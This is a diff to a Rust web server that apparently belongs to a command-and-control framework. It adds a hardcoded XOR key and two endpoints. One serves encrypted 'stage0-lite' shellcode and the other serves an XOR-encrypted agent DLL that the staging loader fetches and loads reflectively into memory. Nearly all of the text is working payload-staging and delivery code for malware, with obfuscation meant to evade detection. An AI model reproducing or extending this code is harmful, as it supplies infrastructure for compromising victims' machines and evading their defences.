@@ -558,6 +558,9 @@ pub async fn server_status(State(state): State<Arc<ApiState>>) -> Json<ServerSta
 /// XOR encryption key for agent download (same as in builder)
 const AGENT_XOR_KEY: &[u8] = b"C2R2_STAGE0_AGENT_KEY_2026";
 
+/// XOR encryption key for stage1 agent DLL download (must match stage0-lite config.h)
+const STAGE1_AGENT_XOR_KEY: &[u8] = b"C2R2_STAGE1_AGENT_KEY_2026_L1TE";
+
 /// Download the full agent (XOR encrypted) for Stage0
 /// 
 /// Stage0 calls this endpoint to download the agent binary.
@@ -643,6 +646,126 @@ pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
     response.extend_from_slice(&(encrypted.len() as u32).to_le_bytes());
     response.extend_from_slice(&encrypted);
     
+    (
+        StatusCode::OK,
+        [(header::CONTENT_TYPE, "application/octet-stream")],
+        response,
+    )
+}
+
+/// Serve stage0-lite shellcode (pre-built by stages/stage0-lite/build.sh)
+///
+/// The file `dist/stage0_lite.bin.enc` is already XOR-encrypted by build.sh.
+/// Response format: 4-byte LE length + raw encrypted bytes
+/// (JAVELIN decrypts with JAVELIN_STAGE0_XOR_KEY at load time)
+pub async fn download_stage0_lite() -> impl axum::response::IntoResponse {
+    use axum::http::{header, StatusCode};
+    use std::fs;
+
+    let search_paths = [
+        "dist/stage0_lite.bin.enc",
+        "stages/stage0-lite/build/stage0_lite.bin.enc",
+        "stage0_lite.bin.enc",
+    ];
+
+    let found = search_paths.iter().find(|p| std::path::Path::new(p).exists());
+
+    let payload = match found {
+        Some(path) => {
+            tracing::info!("Serving stage0-lite from: {}", path);
+            match fs::read(path) {
+                Ok(b) => b,
+                Err(e) => {
+                    tracing::error!("Failed to read {}: {}", path, e);
+                    return (
+                        StatusCode::INTERNAL_SERVER_ERROR,
+                        [(header::CONTENT_TYPE, "application/octet-stream")],
+                        format!("ERROR:{}", e).into_bytes(),
+                    );
+                }
+            }
+        }
+        None => {
+            tracing::error!("stage0_lite.bin.enc not found; run stages/stage0-lite/build.sh first");
+            return (
+                StatusCode::NOT_FOUND,
+                [(header::CONTENT_TYPE, "application/octet-stream")],
+                b"ERROR:stage0_lite not built".to_vec(),
+            );
+        }
+    };
+
+    tracing::info!("Serving stage0-lite ({} bytes, already XOR-encrypted)", payload.len());
+
+    // Prepend 4-byte LE length so JAVELIN or the team client knows the size
+    let mut response = Vec::with_capacity(4 + payload.len());
+    response.extend_from_slice(&(payload.len() as u32).to_le_bytes());
+    response.extend_from_slice(&payload);
+
+    (
+        StatusCode::OK,
+        [(header::CONTENT_TYPE, "application/octet-stream")],
+        response,
+    )
+}
+
+/// Serve the agent DLL for stage0-lite to load reflectively
+///
+/// stage0-lite calls GET /api/stage1/agent_dll after executing.
+/// Response format: 4-byte LE length + XOR-encrypted DLL bytes
+/// (stage0-lite decrypts with STAGE1_XOR_KEY from config.h = "C2R2_STAGE1_AGENT_KEY_2026_L1TE")
+pub async fn download_agent_dll() -> impl axum::response::IntoResponse {
+    use axum::http::{header, StatusCode};
+    use std::fs;
+
+    let search_paths = [
+        "dist/agent.dll",
+        "dist/agent_dll.dll",
+        "agent.dll",
+        "agent/target/x86_64-pc-windows-gnu/release/agent.dll",
+    ];
+
+    let found = search_paths.iter().find(|p| std::path::Path::new(p).exists());
+
+    let dll_bytes = match found {
+        Some(path) => {
+            tracing::info!("Serving agent DLL from: {}", path);
+            match fs::read(path) {
+                Ok(b) => b,
+                Err(e) => {
+                    tracing::error!("Failed to read agent DLL from {}: {}", path, e);
+                    return (
+                        StatusCode::INTERNAL_SERVER_ERROR,
+                        [(header::CONTENT_TYPE, "application/octet-stream")],
+                        format!("ERROR:{}", e).into_bytes(),
+                    );
+                }
+            }
+        }
+        None => {
+            tracing::error!("Agent DLL not found; build the agent first");
+            return (
+                StatusCode::NOT_FOUND,
+                [(header::CONTENT_TYPE, "application/octet-stream")],
+                b"ERROR:Agent DLL not found".to_vec(),
+            );
+        }
+    };
+
+    tracing::info!("Sending agent DLL ({} bytes, XOR-encrypting)", dll_bytes.len());
+
+    // XOR-encrypt the DLL in-place
+    let encrypted: Vec<u8> = dll_bytes
+        .iter()
+        .enumerate()
+        .map(|(i, &byte)| byte ^ STAGE1_AGENT_XOR_KEY[i % STAGE1_AGENT_XOR_KEY.len()])
+        .collect();
+
+    // Response: 4-byte LE length + XOR-encrypted DLL
+    let mut response = Vec::with_capacity(4 + encrypted.len());
+    response.extend_from_slice(&(encrypted.len() as u32).to_le_bytes());
+    response.extend_from_slice(&encrypted);
+
     (
         StatusCode::OK,
         [(header::CONTENT_TYPE, "application/octet-stream")],
